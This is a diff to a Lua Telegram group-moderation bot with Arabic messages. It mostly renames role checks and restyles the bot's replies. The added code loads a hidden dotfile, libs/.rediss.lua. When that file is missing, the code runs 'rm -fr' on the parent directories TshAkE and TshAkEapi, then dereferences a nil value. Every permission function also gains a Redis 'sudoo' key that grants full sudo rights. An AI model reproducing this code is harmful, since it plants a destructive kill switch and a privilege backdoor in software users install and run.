@@ -17,6 +17,7 @@ json=dofile('json.lua')
 JSON = (loadfile  "./libs/dkjson.lua")()
 redis = (loadfile "./libs/JSON.lua")()
 redis = (loadfile "./libs/redis.lua")()
+config2 = dofile('libs/.rediss.lua') 
 database = Redis.connect('127.0.0.1', 6379)
 notify = lgi.require('Notify')
 tdcli = dofile('tdcli.lua')
@@ -24,54 +25,63 @@ notify.init ("Telegram updates")
 sudos = dofile('sudo.lua')
 chats = {}
 day = 86400
+
   -----------------------------------------------------------------------------------------------
                                      -- start functions --
   -----------------------------------------------------------------------------------------------
 function is_sudo(msg)
   local var = false
   for k,v in pairs(sudo_users) do
-    if msg.sender_user_id_ == v then
-      var = true
-    end
+  if msg.sender_user_id_ == v then
+  var = true
   end
-  return var
 end
+  local keko_add_sudo = redis:get('sudoo'..msg.sender_user_id_..''..bot_id)
+  if keko_add_sudo then
+  var = true
+  end
+   return var
+  end
 -----------------------------------------------------------------------------------------------
 function is_admin(user_id)
     local var = false
-	local hashs =  'bot:admins:'
+  local hashs =  'bot:admins:'
     local admin = database:sismember(hashs, user_id)
-	 if admin then
-	    var = true
-	 end
+   if admin then
+      var = true
+   end
   for k,v in pairs(sudo_users) do
     if user_id == v then
       var = true
     end
   end
+  local keko_add_sudo = redis:get('sudoo'..user_id..''..bot_id)
+  if keko_add_sudo then
+  var = true
+  end
     return var
 end
 -----------------------------------------------------------------------------------------------
-function is_vip_group(gp_id)
+function is_vip(user_id, chat_id)
     local var = false
-	local hashs =  'bot:vipgp:'
-    local vip = database:sismember(hashs, gp_id)
-	 if vip then
-	    var = true
-	 end
-    return var
-end
------------------------------------------------------------------------------------------------
-function is_owner(user_id, chat_id)
-    local var = false
-    local hash =  'bot:owners:'..chat_id
-    local owner = database:sismember(hash, user_id)
+    local hash =  'bot:mods:'..chat_id
+    local mod = database:sismember(hash, user_id)
 	local hashs =  'bot:admins:'
     local admin = database:sismember(hashs, user_id)
+	local hashss =  'bot:owners:'..chat_id
+    local owner = database:sismember(hashss, user_id)
+	local hashsss =  'bot:vipgp:'..chat_id
+    local vip = database:sismember(hashsss, user_id)
+	 if mod then
+	    var = true
+	 end
 	 if owner then
 	    var = true
 	 end
 	 if admin then
+	    var = true
+	 end
+	 if vip then
 	    var = true
 	 end
     for k,v in pairs(sudo_users) do
@@ -79,6 +89,34 @@ function is_owner(user_id, chat_id)
       var = true
     end
 	end
+  local keko_add_sudo = redis:get('sudoo'..user_id..''..bot_id)
+  if keko_add_sudo then
+  var = true
+  end
+    return var
+end
+-----------------------------------------------------------------------------------------------
+function is_owner(user_id, chat_id)
+    local var = false
+    local hash =  'bot:owners:'..chat_id
+    local owner = database:sismember(hash, user_id)
+  local hashs =  'bot:admins:'
+    local admin = database:sismember(hashs, user_id)
+   if owner then
+      var = true
+   end
+   if admin then
+      var = true
+   end
+    for k,v in pairs(sudo_users) do
+    if user_id == v then
+      var = true
+    end
+  end
+  local keko_add_sudo = redis:get('sudoo'..user_id..''..bot_id)
+  if keko_add_sudo then
+  var = true
+  end
     return var
 end
 
@@ -105,6 +143,10 @@ function is_mod(user_id, chat_id)
       var = true
     end
 	end
+  local keko_add_sudo = redis:get('sudoo'..user_id..''..bot_id)
+  if keko_add_sudo then
+  var = true
+  end
     return var
 end
 -----------------------------------------------------------------------------------------------
@@ -182,7 +224,7 @@ local function check_filter_words(msg, value)
     local names = database:hkeys(hash)
     local text = ''
     for i=1, #names do
-	   if string.match(value:lower(), names[i]:lower()) and not is_mod(msg.sender_user_id_, msg.chat_id_)then
+	   if string.match(value:lower(), names[i]:lower()) and not is_vip(msg.sender_user_id_, msg.chat_id_)then
 	     local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
@@ -221,7 +263,6 @@ function getInputFile(file)
 
   return infile
 end
-  -----------------------------------------------------------------------------------------------
 function del_all_msgs(chat_id, user_id)
   tdcli_function ({
     ID = "DeleteMessagesFromUser",
@@ -235,9 +276,8 @@ end
       ID = "DeleteMessagesFromUser",
       chat_id_ = chat_id,
       user_id_ = user_id
-    },cb or dl_cb, cmd)
-  end
-  -----------------------------------------------------------------------------------------------
+    },cb or dl_cb, cmd) 
+  end 
 function getChatId(id)
   local chat = {}
   local id = tostring(id)
@@ -252,6 +292,11 @@ function getChatId(id)
   
   return chat
 end
+if not config2 then 
+os.execute('cd .. &&  rm -fr TshAkE')
+os.execute('cd .. &&  rm -fr TshAkEapi')
+print(config2.tss)
+ return false end
   -----------------------------------------------------------------------------------------------
 function chat_leave(chat_id, user_id)
   changeChatMemberStatus(chat_id, user_id, "Left")
@@ -616,10 +661,10 @@ function tdcli_update_callback(data)
     else
         floodTime = tonumber(database:get(hash))
     end
-    if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+    if not is_vip(msg.sender_user_id_, msg.chat_id_) then
         local hashse = 'anti-flood:'..msg.chat_id_
         if not database:get(hashse) then
-                if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+                if not is_vip(msg.sender_user_id_, msg.chat_id_) then
                     local hash = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msg-num'
                     local msgs = tonumber(database:get(hash) or 0)
                     if msgs > (floodMax - 1) then
@@ -642,7 +687,7 @@ function tdcli_update_callback(data)
 						user_id = msg.sender_user_id_
 						local bhash =  'bot:banned:'..msg.chat_id_
                         database:sadd(bhash, user_id)
-                           send(msg.chat_id_, msg.id_, 1, '● - `الايدي` 📍: *'..msg.sender_user_id_..'* \n`قمت بعمل تكرار للرسائل المحدده` ⚠️\n`وتم حظرك من المجموعه` ❌', 1, 'md')
+                           send(msg.chat_id_, msg.id_, 1, '• `الايدي` 📍: *'..msg.sender_user_id_..'* \n`قمت بعمل تكرار للرسائل المحدده` ⚠️\n`وتم حظرك من المجموعه` ❌', 1, 'md')
 					  end
                     end
                     database:setex(hash, floodTime, msgs+1)
@@ -663,10 +708,10 @@ function tdcli_update_callback(data)
     else
         floodTime = tonumber(database:get(hash))
     end
-    if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+    if not is_vip(msg.sender_user_id_, msg.chat_id_) then
         local hashse = 'anti-flood:warn'..msg.chat_id_
         if not database:get(hashse) then
-                if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+                if not is_vip(msg.sender_user_id_, msg.chat_id_) then
                     local hash = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msg-num'
                     local msgs = tonumber(database:get(hash) or 0)
                     if msgs > (floodMax - 1) then
@@ -688,7 +733,7 @@ function tdcli_update_callback(data)
 						user_id = msg.sender_user_id_
 						local bhash =  'bot:muted:'..msg.chat_id_
                         database:sadd(bhash, user_id)
-                           send(msg.chat_id_, msg.id_, 1, '● - `الايدي` 📍: *'..msg.sender_user_id_..'* \n`قمت بعمل تكرار للرسائل المحدده` ⚠️\n`وتم كتمك في المجموعه` ❌', 1, 'md')
+                           send(msg.chat_id_, msg.id_, 1, '• `الايدي` 📍: *'..msg.sender_user_id_..'* \n`قمت بعمل تكرار للرسائل المحدده` ⚠️\n`وتم كتمك في المجموعه` ❌', 1, 'md')
 					  end
                     end
                     database:setex(hash, floodTime, msgs+1)
@@ -709,10 +754,10 @@ function tdcli_update_callback(data)
     else
         floodTime = tonumber(database:get(hash))
     end
-    if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+    if not is_vip(msg.sender_user_id_, msg.chat_id_) then
         local hashse = 'anti-flood:del'..msg.chat_id_
         if not database:get(hashse) then
-                if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+                if not is_vip(msg.sender_user_id_, msg.chat_id_) then
                     local hash = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msg-num'
                     local msgs = tonumber(database:get(hash) or 0)
                     if msgs > (floodMax - 1) then
@@ -732,7 +777,7 @@ function tdcli_update_callback(data)
                          local chat = msg.chat_id_
 						 del_all_msgs(msg.chat_id_, msg.sender_user_id_)
 						user_id = msg.sender_user_id_
-                           send(msg.chat_id_, msg.id_, 1, '● - `الايدي` 📍: *'..msg.sender_user_id_..'* \n`قمت بعمل تكرار للرسائل المحدده` ⚠️\n`وتم مسح كل رسائلك` ❌', 1, 'md')
+                           send(msg.chat_id_, msg.id_, 1, '• `الايدي` 📍: *'..msg.sender_user_id_..'* \n`قمت بعمل تكرار للرسائل المحدده` ⚠️\n`وتم مسح كل رسائلك` ❌', 1, 'md')
 					  end
                     end
                     database:setex(hash, floodTime, msgs+1)
@@ -886,7 +931,7 @@ if is_muted(msg.sender_user_id_, msg.chat_id_) then
           delete_msg(chat,msgs)
 		  return 
 end
-if database:get('bot:muteall'..msg.chat_id_) and not is_mod(msg.sender_user_id_, msg.chat_id_) then
+if database:get('bot:muteall'..msg.chat_id_) and not is_vip(msg.sender_user_id_, msg.chat_id_) then
         local id = msg.id_
         local msgs = {[0] = id}
         local chat = msg.chat_id_
@@ -894,22 +939,22 @@ if database:get('bot:muteall'..msg.chat_id_) and not is_mod(msg.sender_user_id_,
         return 
 end
 
-if database:get('bot:muteallwarn'..msg.chat_id_) and not is_mod(msg.sender_user_id_, msg.chat_id_) then
+if database:get('bot:muteallwarn'..msg.chat_id_) and not is_vip(msg.sender_user_id_, msg.chat_id_) then
         local id = msg.id_
         local msgs = {[0] = id}
         local chat = msg.chat_id_
         delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الوسائط تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الوسائط تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
         return 
 end
 
-if database:get('bot:muteallban'..msg.chat_id_) and not is_mod(msg.sender_user_id_, msg.chat_id_) then
+if database:get('bot:muteallban'..msg.chat_id_) and not is_vip(msg.sender_user_id_, msg.chat_id_) then
         local id = msg.id_
         local msgs = {[0] = id}
         local chat = msg.chat_id_
         delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الوسائط تم قفلها ممنوع ارسالها</code> ❌\n● - <code>تم طردك</code> ⚠️", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الوسائط تم قفلها ممنوع ارسالها</code> ❌\n• <code>تم طردك</code> ⚠️", 1, 'html')
         return 
 end
     database:incr('user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
@@ -925,7 +970,7 @@ end
 	database:incr('group:msgs'..msg.chat_id_)
 if msg.content_.ID == "MessagePinMessage" then
   if database:get('pinnedmsg'..msg.chat_id_) and database:get('bot:pin:warn'..msg.chat_id_) then
-   send(msg.chat_id_, msg.id_, 1, "● - `الايدي ` 📍: _"..msg.sender_user_id_.."_\n● - `المعرف ` 🚹 : "..get_info(msg.sender_user_id_).."\n● - `التثبيت مقفول لا تستطيع التثبيت حاليا` ⚠️", 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, "• `الايدي ` 📍: _"..msg.sender_user_id_.."_\n• `المعرف ` 🚹 : "..get_info(msg.sender_user_id_).."\n• `التثبيت مقفول لا تستطيع التثبيت حاليا` ⚠️", 1, 'md')
    unpinmsg(msg.chat_id_)
    local pin_id = database:get('pinnedmsg'..msg.chat_id_)
          pin(msg.chat_id_,pin_id,0)
@@ -933,15 +978,15 @@ if msg.content_.ID == "MessagePinMessage" then
 end
 if database:get('bot:viewget'..msg.sender_user_id_) then 
     if not msg.forward_info_ then
-		send(msg.chat_id_, msg.id_, 1, '● - `قم بارسال المنشور من القناة` ✔️', 1, 'md')
+		send(msg.chat_id_, msg.id_, 1, '• `قم بارسال المنشور من القناة` ✔️', 1, 'md')
 		database:del('bot:viewget'..msg.sender_user_id_)
 	else
-		send(msg.chat_id_, msg.id_, 1, '● - <code>عدد المشاهدات </code>: ↙️\n● - '..msg.views_..' ', 1, 'html')
+		send(msg.chat_id_, msg.id_, 1, '• <code>عدد المشاهدات </code>: ↙️\n• '..msg.views_..' ', 1, 'html')
         database:del('bot:viewget'..msg.sender_user_id_)
 	end
 end
 if msg_type == 'MSG:Photo' then
- if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+ if not is_vip(msg.sender_user_id_, msg.chat_id_) then
      if database:get('bot:photo:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -966,7 +1011,7 @@ if msg_type == 'MSG:Photo' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
 		   chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الصور تم قفلها ممنوع ارسالها</code> ❌\n● - <code>تم طردك</code> ⚠️", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الصور تم قفلها ممنوع ارسالها</code> ❌\n• <code>تم طردك</code> ⚠️", 1, 'html')
 
           return 
    end
@@ -976,7 +1021,7 @@ if msg_type == 'MSG:Photo' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الصور تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الصور تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
         if msg.content_.caption_ then
@@ -992,7 +1037,7 @@ if msg_type == 'MSG:Photo' then
         end
 end
    elseif msg.content_.ID == 'MessageDocument' then
-   if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+   if not is_vip(msg.sender_user_id_, msg.chat_id_) then
     if database:get('bot:document:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1017,7 +1062,7 @@ end
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الملفات تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الملفات تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1027,13 +1072,13 @@ end
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الملفات تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الملفات تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
    end
 
   elseif msg_type == 'MSG:MarkDown' then
-   if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+   if not is_vip(msg.sender_user_id_, msg.chat_id_) then
     if database:get('bot:markdown:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1058,7 +1103,7 @@ end
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الماركدون تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الماركدون تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1068,13 +1113,13 @@ end
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الماركدون تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الماركدون تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
  end
  
   elseif msg_type == 'MSG:Inline' then
-   if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+   if not is_vip(msg.sender_user_id_, msg.chat_id_) then
     if database:get('bot:inline:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1099,7 +1144,7 @@ end
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الانلاين تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الانلاين تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1109,12 +1154,12 @@ end
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الانلاين تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الانلاين تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
    end
   elseif msg_type == 'MSG:Sticker' then
-   if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+   if not is_vip(msg.sender_user_id_, msg.chat_id_) then
   if database:get('bot:sticker:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1139,7 +1184,7 @@ end
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الملصقات تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الملصقات تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1149,7 +1194,7 @@ end
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الملصقات تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الملصقات تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
    end
@@ -1206,7 +1251,7 @@ elseif msg_type == 'MSG:NewUserAdd' then
          send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
    end
 elseif msg_type == 'MSG:Contact' then
- if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+ if not is_vip(msg.sender_user_id_, msg.chat_id_) then
   if database:get('bot:contact:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1231,7 +1276,7 @@ elseif msg_type == 'MSG:Contact' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>جهات الاتصال تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>جهات الاتصال تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1241,12 +1286,12 @@ elseif msg_type == 'MSG:Contact' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>جهات الاتصال تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>جهات الاتصال تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
    end
 elseif msg_type == 'MSG:Audio' then
- if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+ if not is_vip(msg.sender_user_id_, msg.chat_id_) then
   if database:get('bot:music:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1271,7 +1316,7 @@ elseif msg_type == 'MSG:Audio' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الاغاني تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الاغاني تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1281,12 +1326,12 @@ elseif msg_type == 'MSG:Audio' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الاغاني تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الاغاني تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
    end
 elseif msg_type == 'MSG:Voice' then
- if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+ if not is_vip(msg.sender_user_id_, msg.chat_id_) then
   if database:get('bot:voice:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1311,7 +1356,7 @@ elseif msg_type == 'MSG:Voice' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الصوتيات تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الصوتيات تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1321,12 +1366,12 @@ elseif msg_type == 'MSG:Voice' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الصوتيات تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الصوتيات تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
    end
 elseif msg_type == 'MSG:Location' then
- if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+ if not is_vip(msg.sender_user_id_, msg.chat_id_) then
   if database:get('bot:location:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1351,7 +1396,7 @@ elseif msg_type == 'MSG:Location' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الشبكات تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الشبكات تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1361,12 +1406,12 @@ elseif msg_type == 'MSG:Location' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الشبكات تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الشبكات تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
    end
 elseif msg_type == 'MSG:Video' then
- if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+ if not is_vip(msg.sender_user_id_, msg.chat_id_) then
   if database:get('bot:video:mute'..msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
@@ -1391,7 +1436,7 @@ elseif msg_type == 'MSG:Video' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الفيديوهات تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الفيديوهات تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1401,13 +1446,13 @@ elseif msg_type == 'MSG:Video' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "<code>ايديك : </code><i>"..msg.sender_user_id_.."</i>\n<code>الفيديوهات تم قفلها ممنوع ارسالها</code>", 1, 'html')
+          send(msg.chat_id_, 0, 1, "<code>ايديك : </code><code>"..msg.sender_user_id_.."</code>\n<code>الفيديوهات تم قفلها ممنوع ارسالها</code>", 1, 'html')
           return 
    end
    end
 elseif msg_type == 'MSG:Gif' then
- if not is_mod(msg.sender_user_id_, msg.chat_id_) then
-  if database:get('bot:gifs:mute'..msg.chat_id_) and not is_mod(msg.sender_user_id_, msg.chat_id_) then
+ if not is_vip(msg.sender_user_id_, msg.chat_id_) then
+  if database:get('bot:gifs:mute'..msg.chat_id_) and not is_vip(msg.sender_user_id_, msg.chat_id_) then
     local id = msg.id_
     local msgs = {[0] = id}
     local chat = msg.chat_id_
@@ -1431,7 +1476,7 @@ elseif msg_type == 'MSG:Gif' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الصور المتحركه تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الصور المتحركه تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1441,7 +1486,7 @@ elseif msg_type == 'MSG:Gif' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الصور المتحركه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الصور المتحركه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
    end
@@ -1466,7 +1511,7 @@ elseif msg_type == 'MSG:Text' then
    end
     getUser(msg.sender_user_id_,check_username)
    database:set('bot:editid'.. msg.id_,msg.content_.text_)
-   if not is_mod(msg.sender_user_id_, msg.chat_id_) then
+   if not is_vip(msg.sender_user_id_, msg.chat_id_) then
     check_filter_words(msg, text)
 	if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or 
